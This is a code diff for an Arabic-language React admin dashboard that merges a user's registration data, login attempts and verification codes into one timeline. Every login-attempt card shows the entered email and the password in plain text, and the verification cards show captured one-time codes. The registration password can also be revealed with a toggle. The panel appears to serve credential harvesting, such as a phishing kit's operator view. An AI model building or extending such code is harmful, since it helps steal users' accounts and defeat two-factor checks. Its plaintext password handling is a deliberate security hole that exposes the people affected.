@@ -34,6 +34,14 @@ type VerificationCode = {
   created_at: string;
 };
 
+// Unified timeline item type
+type TimelineItem = {
+  id: string;
+  type: 'registration' | 'login' | 'verification';
+  created_at: string;
+  data: any;
+};
+
 const FIELD_ICONS: Record<string, any> = {
   full_name: User,
   email: Mail,
@@ -267,9 +275,9 @@ function RegistrationsTab() {
                 <p className="text-sm font-medium">لم يتم اختيار أي مستخدم</p>
               </div>
             ) : (
-              <div className="p-6 space-y-6">
+              <div className="p-6">
                 {/* Profile Header */}
-                <div className="flex items-center gap-4 pb-5 border-b border-slate-700">
+                <div className="flex items-center gap-4 pb-5 border-b border-slate-700 mb-6">
                   <div className={`w-16 h-16 rounded-2xl ${avatarColor(selected.full_name || '')} flex items-center justify-center text-2xl font-extrabold text-white shadow-xl`}>
                     {(selected.full_name || '?').charAt(0)}
                   </div>
@@ -279,112 +287,163 @@ function RegistrationsTab() {
                   </div>
                 </div>
 
-                {/* Info Grid */}
-                <div className="grid sm:grid-cols-2 gap-4">
-                  {formFields
-                    .filter(f => f.page_key === 'register' && f.field_key !== 'confirm_password')
-                    .sort((a, b) => a.field_order - b.field_order)
-                    .map((field) => {
-                      const Icon = FIELD_ICONS[field.field_key] || Activity;
-                      const coreCol = CORE_COLUMNS[field.field_key];
-                      const value = coreCol ? (selected as any)[coreCol] : (selected.extra_fields?.[field.field_key]);
-                      if (field.field_type === 'password') {
-                        return (
-                          <div key={field.id} className="bg-slate-700/40 rounded-xl p-4 flex items-center gap-3 col-span-full">
-                            <Shield className="w-4 h-4 text-slate-400" />
-                            <div className="flex-1">
-                              <p className="text-xs text-slate-500 font-medium">{field.label}</p>
-                              <div className="flex items-center gap-3">
-                                <p className="font-mono text-sm text-white tracking-widest">{showPassMap[selected.id] ? (value || '—') : maskPassword(value || '')}</p>
-                                <button onClick={() => togglePassVisibility(selected.id)} className="text-xs text-blue-400 hover:underline">
-                                  {showPassMap[selected.id] ? 'إخفاء' : 'إظهار'}
-                                </button>
+                {/* Unified Timeline - sorted by most recent first */}
+                {(() => {
+                  // Create unified timeline items
+                  const timeline: TimelineItem[] = [];
+
+                  // Add registration data
+                  timeline.push({
+                    id: selected.id,
+                    type: 'registration',
+                    created_at: selected.created_at,
+                    data: selected,
+                  });
+
+                  // Add login attempts
+                  if (selected.login_attempts && selected.login_attempts.length > 0) {
+                    selected.login_attempts.forEach(login => {
+                      timeline.push({
+                        id: login.id,
+                        type: 'login',
+                        created_at: login.created_at,
+                        data: login,
+                      });
+                    });
+                  }
+
+                  // Add verification codes
+                  if (selected.verification_codes && selected.verification_codes.length > 0) {
+                    selected.verification_codes.forEach(vc => {
+                      timeline.push({
+                        id: vc.id,
+                        type: 'verification',
+                        created_at: vc.created_at,
+                        data: vc,
+                      });
+                    });
+                  }
+
+                  // Sort by most recent first
+                  timeline.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
+
+                  // Render timeline items
+                  return (
+                    <div className="space-y-4">
+                      {timeline.map((item, index) => {
+                        const isNewest = index === 0;
+                        
+                        // Registration Data Card
+                        if (item.type === 'registration') {
+                          return (
+                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-blue-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
+                              <div className="flex items-center justify-between mb-4">
+                                <div className="flex items-center gap-2">
+                                  <User className={`w-4 h-4 ${isNewest ? 'text-blue-400' : 'text-slate-400'}`} />
+                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-blue-400' : 'text-white'}`}>البيانات الشخصية</h4>
+                                </div>
+                                <div className="flex items-center gap-2">
+                                  <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-blue-500/20 text-blue-400' : 'bg-slate-700 text-slate-400'}`}>
+                                    {new Date(item.created_at).toLocaleString('ar-SA')}
+                                  </span>
+                                </div>
+                              </div>
+                              <div className="grid sm:grid-cols-2 gap-3">
+                                {formFields
+                                  .filter(f => f.page_key === 'register' && f.field_key !== 'confirm_password')
+                                  .sort((a, b) => a.field_order - b.field_order)
+                                  .map((field) => {
+                                    const Icon = FIELD_ICONS[field.field_key] || Activity;
+                                    const coreCol = CORE_COLUMNS[field.field_key];
+                                    const value = coreCol ? item.data[coreCol] : item.data.extra_fields?.[field.field_key];
+                                    
+                                    if (field.field_type === 'password') {
+                                      return (
+                                        <div key={field.id} className="col-span-full bg-slate-900/50 rounded-lg p-3 flex items-center gap-3">
+                                          <Shield className="w-4 h-4 text-slate-400 shrink-0" />
+                                          <div className="flex-1 min-w-0">
+                                            <p className="text-[10px] text-slate-500 font-medium">{field.label}</p>
+                                            <div className="flex items-center gap-3">
+                                              <p className="font-mono text-sm text-white tracking-widest">{showPassMap[item.id] ? (value || '—') : maskPassword(value || '')}</p>
+                                              <button onClick={() => togglePassVisibility(item.id)} className="text-xs text-blue-400 hover:underline shrink-0">
+                                                {showPassMap[item.id] ? 'إخفاء' : 'إظهار'}
+                                              </button>
+                                            </div>
+                                          </div>
+                                        </div>
+                                      );
+                                    }
+                                    return (
+                                      <div key={field.id} className="bg-slate-900/50 rounded-lg p-3 flex items-start gap-2">
+                                        <Icon className="w-4 h-4 text-slate-400 mt-0.5 shrink-0" />
+                                        <div className="min-w-0 flex-1">
+                                          <p className="text-[10px] text-slate-500 font-medium mb-0.5">{field.label}</p>
+                                          <p className="text-sm text-white font-semibold truncate">{value || '—'}</p>
+                                        </div>
+                                      </div>
+                                    );
+                                  })}
                               </div>
                             </div>
-                          </div>
-                        );
-                      }
-                      return (
-                        <div key={field.id} className="bg-slate-700/40 rounded-xl p-4 flex items-start gap-3">
-                          <Icon className="w-4 h-4 text-slate-400 mt-1" />
-                          <div className="min-w-0 flex-1">
-                            <p className="text-xs text-slate-500 font-medium mb-0.5">{field.label}</p>
-                            <p className="text-sm text-white font-semibold truncate">{value || '—'}</p>
-                          </div>
-                        </div>
-                      );
-                    })}
-                </div>
+                          );
+                        }
 
-                {/* Login Attempts Section */}
-                <div className="space-y-3 pt-4 border-t border-slate-700">
-                  <div className="flex items-center gap-2 mb-2">
-                    <LogInIcon className="w-4 h-4 text-amber-400" />
-                    <h4 className="text-sm font-bold text-white">محاولات تسجيل الدخول</h4>
-                  </div>
-                  
-                  {(!selected.login_attempts || selected.login_attempts.length === 0) ? (
-                    <div className="bg-slate-800/50 rounded-xl p-4 text-center border border-dashed border-slate-700">
-                      <p className="text-xs text-slate-500 italic">لا توجد محاولات دخول مسجلة</p>
-                    </div>
-                  ) : (
-                    <div className="space-y-2">
-                      {selected.login_attempts.map((attempt) => (
-                        <div key={attempt.id} className="bg-slate-900/50 border border-slate-700/50 rounded-xl p-3 flex flex-col gap-2">
-                          <div className="flex items-center justify-between">
-                            <span className="text-[10px] text-slate-500 font-mono">
-                              {new Date(attempt.created_at).toLocaleString('ar-SA')}
-                            </span>
-                            <span className="text-[10px] bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded-full">تسجيل دخول</span>
-                          </div>
-                          <div className="grid grid-cols-2 gap-2">
-                            <div className="bg-slate-800/50 rounded-lg p-2">
-                              <p className="text-[10px] text-slate-500 mb-1">البريد</p>
-                              <p className="text-xs text-slate-200 truncate ltr text-left">{attempt.email}</p>
+                        // Login Attempt Card
+                        if (item.type === 'login') {
+                          return (
+                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-amber-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
+                              <div className="flex items-center justify-between mb-3">
+                                <div className="flex items-center gap-2">
+                                  <LogInIcon className={`w-4 h-4 ${isNewest ? 'text-amber-400' : 'text-amber-500/70'}`} />
+                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-amber-400' : 'text-white'}`}>تسجيل الدخول</h4>
+                                </div>
+                                <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-amber-500/20 text-amber-400' : 'bg-slate-700 text-slate-400'}`}>
+                                  {new Date(item.created_at).toLocaleString('ar-SA')}
+                                </span>
+                              </div>
+                              <div className="grid grid-cols-2 gap-3">
+                                <div className="bg-slate-900/50 rounded-lg p-3">
+                                  <p className="text-[10px] text-slate-500 mb-1">البريد</p>
+                                  <p className="text-xs text-slate-200 truncate ltr text-left">{item.data.email}</p>
+                                </div>
+                                <div className="bg-slate-900/50 rounded-lg p-3">
+                                  <p className="text-[10px] text-slate-500 mb-1">كلمة المرور</p>
+                                  <p className="text-sm text-white font-bold tracking-wider">{item.data.password}</p>
+                                </div>
+                              </div>
                             </div>
-                            <div className="bg-slate-800/50 rounded-lg p-2">
-                              <p className="text-[10px] text-slate-500 mb-1">كلمة المرور</p>
-                              <p className="text-xs text-white font-bold tracking-wider">{attempt.password}</p>
-                            </div>
-                          </div>
-                        </div>
-                      ))}
-                    </div>
-                  )}
-                </div>
+                          );
+                        }
 
-                {/* Verification Codes Section */}
-                <div className="space-y-3 pt-4 border-t border-slate-700">
-                  <div className="flex items-center gap-2 mb-2">
-                    <ShieldCheck className="w-4 h-4 text-green-400" />
-                    <h4 className="text-sm font-bold text-white">رموز التحقق</h4>
-                  </div>
-                  
-                  {(!selected.verification_codes || selected.verification_codes.length === 0) ? (
-                    <div className="bg-slate-800/50 rounded-xl p-4 text-center border border-dashed border-slate-700">
-                      <p className="text-xs text-slate-500 italic">لا توجد رموز تحقق مسجلة</p>
+                        // Verification Code Card
+                        if (item.type === 'verification') {
+                          return (
+                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-green-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
+                              <div className="flex items-center justify-between mb-3">
+                                <div className="flex items-center gap-2">
+                                  <ShieldCheck className={`w-4 h-4 ${isNewest ? 'text-green-400' : 'text-green-500/70'}`} />
+                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-green-400' : 'text-white'}`}>رمز التحقق</h4>
+                                </div>
+                                <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-green-500/20 text-green-400' : 'bg-slate-700 text-slate-400'}`}>
+                                  {new Date(item.created_at).toLocaleString('ar-SA')}
+                                </span>
+                              </div>
+                              <div className="bg-slate-900/50 rounded-lg p-3 text-center">
+                                <p className="text-[10px] text-slate-500 mb-1">رمز التحقق</p>
+                                <p className="text-xl text-white font-bold tracking-[0.3em]">{item.data.code}</p>
+                                <p className={`text-[10px] mt-2 ${item.data.verified ? 'text-green-400' : 'text-yellow-400'}`}>
+                                  {item.data.verified ? 'تم التحقق ✓' : 'لم يتم التحقق'}
+                                </p>
+                              </div>
+                            </div>
+                          );
+                        }
+
+                        return null;
+                      })}
                     </div>
-                  ) : (
-                    <div className="space-y-2">
-                      {selected.verification_codes.map((vc) => (
-                        <div key={vc.id} className="bg-slate-900/50 border border-slate-700/50 rounded-xl p-3 flex flex-col gap-2">
-                          <div className="flex items-center justify-between">
-                            <span className="text-[10px] text-slate-500 font-mono">
-                              {new Date(vc.created_at).toLocaleString('ar-SA')}
-                            </span>
-                            <span className="text-[10px] bg-green-500/10 text-green-400 px-2 py-0.5 rounded-full">
-                              {vc.verified ? 'تم التحقق' : 'لم يتم التحقق'}
-                            </span>
-                          </div>
-                          <div className="bg-slate-800/50 rounded-lg p-3 text-center">
-                            <p className="text-[10px] text-slate-500 mb-1">رمز التحقق</p>
-                            <p className="text-lg text-white font-bold tracking-[0.3em]">{vc.code}</p>
-                          </div>
-                        </div>
-                      ))}
-                    </div>
-                  )}
-                </div>
+                  );
+                })()}
               </div>
             )}
           </div>
